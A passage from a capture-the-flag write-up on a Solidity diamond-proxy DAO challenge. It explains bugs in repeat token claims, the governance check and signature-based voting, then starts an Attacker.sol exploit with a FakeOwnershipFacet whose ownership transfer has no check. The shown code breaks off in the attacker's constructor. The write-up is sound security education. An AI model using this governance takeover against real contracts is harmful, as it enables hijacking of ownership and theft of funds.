</span></span><span class="line"><span class="cl">        <span class="n">_moveDelegates</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">delegates</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">],</span> <span class="n">s</span><span class="p">.</span><span class="n">delegates</span><span class="p">[</span><span class="n">_to</span><span class="p">],</span> <span class="n">_amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transferFrom</span><span class="p">(</span><span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">allowed</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">allowances</span><span class="p">[</span><span class="n">_from</span><span class="p">][</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">allowed</span> <span class="o">!=</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="p">.</span><span class="n">allowances</span><span class="p">[</span><span class="n">_from</span><span class="p">][</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">allowed</span> <span class="o">-</span> <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="p">.</span><span class="n">balances</span><span class="p">[</span><span class="n">_from</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">unchecked</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="p">.</span><span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">_moveDelegates</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">delegates</span><span class="p">[</span><span class="n">_from</span><span class="p">],</span> <span class="n">s</span><span class="p">.</span><span class="n">delegates</span><span class="p">[</span><span class="n">_to</span><span class="p">],</span> <span class="n">_amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/*//////////////////////////////////////////////////////////////
</span></span></span><span class="line"><span class="cl"><span class="cm">                        DELEGATE LOGIC
</span></span></span><span class="line"><span class="cl"><span class="cm">    //////////////////////////////////////////////////////////////*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">delegate</span><span class="p">(</span><span class="kt">address</span> <span class="n">_delegatee</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">_delegate</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_delegatee</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getCurrentVotes</span><span class="p">(</span><span class="kt">address</span> <span class="n">_account</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">LibDAO</span><span class="p">.</span><span class="n">getCurrentVotes</span><span class="p">(</span><span class="n">_account</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getNumberOfCheckpoints</span><span class="p">(</span><span class="kt">address</span> <span class="n">_account</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">numCheckpoints</span><span class="p">[</span><span class="n">_account</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getCheckpoint</span><span class="p">(</span><span class="kt">address</span> <span class="n">_account</span><span class="p">,</span> <span class="kt">uint32</span> <span class="n">_pos</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="n">Checkpoint</span> <span class="k">memory</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">checkpoints</span><span class="p">[</span><span class="n">_account</span><span class="p">][</span><span class="n">_pos</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getPriorVotes</span><span class="p">(</span><span class="kt">address</span> <span class="n">_account</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_blockNumber</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">LibDAO</span><span class="p">.</span><span class="n">getPriorVotes</span><span class="p">(</span><span class="n">_account</span><span class="p">,</span> <span class="n">_blockNumber</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_delegate</span><span class="p">(</span><span class="kt">address</span> <span class="n">_delegator</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_delegatee</span><span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">currentDelegate</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">delegates</span><span class="p">[</span><span class="n">_delegator</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">delegatorBalance</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">balances</span><span class="p">[</span><span class="n">_delegator</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="p">.</span><span class="n">delegates</span><span class="p">[</span><span class="n">_delegator</span><span class="p">]</span> <span class="o">=</span> <span class="n">_delegatee</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">_moveDelegates</span><span class="p">(</span><span class="n">currentDelegate</span><span class="p">,</span> <span class="n">_delegatee</span><span class="p">,</span> <span class="n">delegatorBalance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_moveDelegates</span><span class="p">(</span><span class="kt">address</span> <span class="n">_src</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_dst</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">_src</span> <span class="o">!=</span> <span class="n">_dst</span> <span class="o">&amp;&amp;</span> <span class="n">_amount</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">_src</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">uint32</span> <span class="n">srcRepNum</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">numCheckpoints</span><span class="p">[</span><span class="n">_src</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="kt">uint256</span> <span class="n">srcRepOld</span> <span class="o">=</span> <span class="n">srcRepNum</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="n">s</span><span class="p">.</span><span class="n">checkpoints</span><span class="p">[</span><span class="n">_src</span><span class="p">][</span><span class="n">srcRepNum</span> <span class="o">-</span> <span class="mi">1</span><span class="p">].</span><span class="n">votes</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="kt">uint256</span> <span class="n">srcRepNew</span> <span class="o">=</span> <span class="n">srcRepOld</span> <span class="o">-</span> <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">_writeCheckpoint</span><span class="p">(</span><span class="n">_src</span><span class="p">,</span> <span class="n">srcRepNum</span><span class="p">,</span> <span class="n">srcRepOld</span><span class="p">,</span> <span class="n">srcRepNew</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">_dst</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">uint32</span> <span class="n">dstRepNum</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">numCheckpoints</span><span class="p">[</span><span class="n">_dst</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="kt">uint256</span> <span class="n">dstRepOld</span> <span class="o">=</span> <span class="n">dstRepNum</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="n">s</span><span class="p">.</span><span class="n">checkpoints</span><span class="p">[</span><span class="n">_dst</span><span class="p">][</span><span class="n">dstRepNum</span> <span class="o">-</span> <span class="mi">1</span><span class="p">].</span><span class="n">votes</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="kt">uint256</span> <span class="n">dstRepNew</span> <span class="o">=</span> <span class="n">dstRepOld</span> <span class="o">+</span> <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">_writeCheckpoint</span><span class="p">(</span><span class="n">_dst</span><span class="p">,</span> <span class="n">dstRepNum</span><span class="p">,</span> <span class="n">dstRepOld</span><span class="p">,</span> <span class="n">dstRepNew</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_writeCheckpoint</span><span class="p">(</span><span class="kt">address</span> <span class="n">_delegatee</span><span class="p">,</span> <span class="kt">uint32</span> <span class="n">_nCheckpoints</span><span class="p">,</span> <span class="kt">uint256</span><span class="p">,</span> <span class="cm">/* _oldVotes */</span> <span class="kt">uint256</span> <span class="n">_newVotes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">internal</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint32</span> <span class="n">blockNumber</span> <span class="o">=</span> <span class="n">safe32</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">number</span><span class="p">,</span> <span class="s">&#34;FTC: block number exceeds 32 bits&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">_nCheckpoints</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">s</span><span class="p">.</span><span class="n">checkpoints</span><span class="p">[</span><span class="n">_delegatee</span><span class="p">][</span><span class="n">_nCheckpoints</span> <span class="o">-</span> <span class="mi">1</span><span class="p">].</span><span class="n">fromBlock</span> <span class="o">==</span> <span class="n">blockNumber</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="p">.</span><span class="n">checkpoints</span><span class="p">[</span><span class="n">_delegatee</span><span class="p">][</span><span class="n">_nCheckpoints</span> <span class="o">-</span> <span class="mi">1</span><span class="p">].</span><span class="n">votes</span> <span class="o">=</span> <span class="n">_newVotes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="p">.</span><span class="n">checkpoints</span><span class="p">[</span><span class="n">_delegatee</span><span class="p">][</span><span class="n">_nCheckpoints</span><span class="p">]</span> <span class="o">=</span> <span class="n">Checkpoint</span><span class="p">(</span><span class="n">blockNumber</span><span class="p">,</span> <span class="n">_newVotes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="p">.</span><span class="n">numCheckpoints</span><span class="p">[</span><span class="n">_delegatee</span><span class="p">]</span> <span class="o">=</span> <span class="n">_nCheckpoints</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/*//////////////////////////////////////////////////////////////
</span></span></span><span class="line"><span class="cl"><span class="cm">                        MINT / BURN LOGIC
</span></span></span><span class="line"><span class="cl"><span class="cm">    //////////////////////////////////////////////////////////////*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_mint</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="p">.</span><span class="n">totalSupply</span> <span class="o">+=</span> <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">unchecked</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="p">.</span><span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_burn</span><span class="p">(</span><span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="p">.</span><span class="n">balances</span><span class="p">[</span><span class="n">_from</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">unchecked</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="p">.</span><span class="n">totalSupply</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/*//////////////////////////////////////////////////////////////
</span></span></span><span class="line"><span class="cl"><span class="cm">                        INTERNAL UTILS
</span></span></span><span class="line"><span class="cl"><span class="cm">    //////////////////////////////////////////////////////////////*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">safe32</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_number</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">_errorMessage</span><span class="p">)</span> <span class="k">internal</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">_number</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="o">**</span> <span class="mi">32</span><span class="p">,</span> <span class="n">_errorMessage</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">uint32</span><span class="p">(</span><span class="n">_number</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Skimming through the code, this is the token that is being used to calculate the <code>votes</code> during processing proposal. Basically, we can call <code>delegate</code> to set up the value of <code>votes</code> that is used during processing the proposal, where the value is equivalent with the number of <code>FTC</code> token that we have.</p>
<p>Now that we&rsquo;ve skimmed through the code, let&rsquo;s try to think on how to solve the challenge.</p>
<h3 id="solution-3">Solution</h3>
<p>I noticed that there are some interesting observations that I found:</p>
<ul>
<li>In the <code>Setup</code> contract, we can actually call <code>claim</code> multiple times because they forgot to set the <code>claimed</code> to <code>true</code> during calling it.
<ul>
<li>That means, our user can have all the minted token by <code>Setup</code>.</li>
</ul>
</li>
<li>Looking at the <code>isUserGovernance</code> method, the simplified logic is basically just trying to cheeck whether <code>totalSupply &gt;= 100</code>, which is always <code>true</code>.
<ul>
<li>This function is called to decide whether user can submit a proposal or not.</li>
<li>Because it always return <code>true</code>, that means user can always submit a proposal</li>
</ul>
</li>
<li>Looking at the <code>castVoteBySig</code> method, we noticed that:
<ul>
<li>The call <code>getPriorVotes</code> was using the <code>msg.sender</code> instead of the <code>signer</code> address.</li>
<li>This means that one user can cast multiple votes as long as they can provide any <code>signature</code> which is recovered to non-null address.</li>
</ul>
</li>
</ul>
<p>Checking through the <code>executeProposal</code> code, the requirement to execute the proposal is:</p>
<ul>
<li>Proposal isn&rsquo;t executed yet (A proposal can only be executed once).</li>
<li><code>block.number &gt;= proposal.endBlock</code>
<ul>
<li>Looking at the challenge description, they use foundry, which will increased the <code>block.number</code> by 1 per <code>10</code> seconds.</li>
<li>Because the <code>proposal.endBlock</code> is <code>proposal.startBlock + 6</code>, that means we need to wait one minute before calling the <code>executeProposal</code>.</li>
</ul>
</li>
<li>The <code>proposal.forVotes</code> is required to be more than <code>proposal.againstVotes</code> and more than <code>(s.totalSupply / 10)</code>, which is around 100k votes.
<ul>
<li>This can easily achieved by two bugs that we found. Either:
<ul>
<li>Call <code>claim</code> multiple times so that our user can directly call <code>castVoteBySig</code> with votes larger than 100k.</li>
<li>Or, we can also call <code>castVoteBySig</code> multiple times with different signature, because the <code>votes</code> value that was fetched was the <code>msg.sender</code> balance instead of the <code>signer</code>.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>I found that the multiple <code>claim</code> calls are easier, so I decided to go with that.</p>
<p>Now that we know we can execute an upgrade proposal, let&rsquo;s think on what we should do with it.</p>
<p>Because the goal is to be the <code>owner</code> of the <code>pigeonDiamond</code>, we can simply deploy our <code>FakeOwnershipFacet</code> in the proposal. The <code>FakeOwnershipFacet</code> will replace the <code>transferOwnership</code> method so that it can be called wihout being the current <code>owner</code> of the diamond.</p>
<p>After upgrading it, we can simply call the <code>emergencyWithdraw</code> to satisfy the required ether balance to solve the challenge.</p>
<h3 id="full-script-3">Full Script</h3>
<p><strong>Attacker.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IDiamondCut</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IDiamondCut.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IDiamondLoupe</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IDiamondLoupe.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IOwnershipFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IOwnershipFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IERC20.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">DiamondCutFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/DiamondCutFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">OwnershipFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/OwnershipFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">DiamondLoupeFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/DiamondLoupeFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">FeatherCoinFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/FTCFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">DAOFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/DAOFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">PigeonVaultFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/PigeonVaultFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">PigeonDiamond</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./PigeonDiamond.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">InitDiamond</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./InitDiamond.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC173</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IERC173.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">LibDiamond</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./libraries/LibDiamond.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./Setup.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">FakeOwnershipFacet</span> <span class="k">is</span> <span class="n">IERC173</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transferOwnership</span><span class="p">(</span><span class="kt">address</span> <span class="n">_newOwner</span><span class="p">)</span> <span class="k">external</span> <span class="k">override</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">LibDiamond</span><span class="p">.</span><span class="n">setContractOwner</span><span class="p">(</span><span class="n">_newOwner</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">owner</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">override</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">owner_</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">owner_</span> <span class="o">=</span> <span class="n">LibDiamond</span><span class="p">.</span><span class="n">contractOwner</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Attacker</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">pigeonDiamond</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">FakeOwnershipFacet</span> <span class="n">fakeOwnershipFacet</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DAOFacet</span> <span class="n">dao</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">FeatherCoinFacet</span> <span class="n">ftc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Setup</span> <span class="n">setup</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">proposalId</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_pigeonDiamond</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_setup</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">pigeonDiamond</span> <span class="o">=</span> <span class="n">_pigeonDiamond</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftc</span> <span class="o">=</span> <span class="n">FeatherCoinFacet</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">dao</span> <span class="o">=</span> <span class="n">DAOFacet</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">        <span class="n">fakeOwnershipFacet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FakeOwnershipFacet</span><span class="p">();</span>
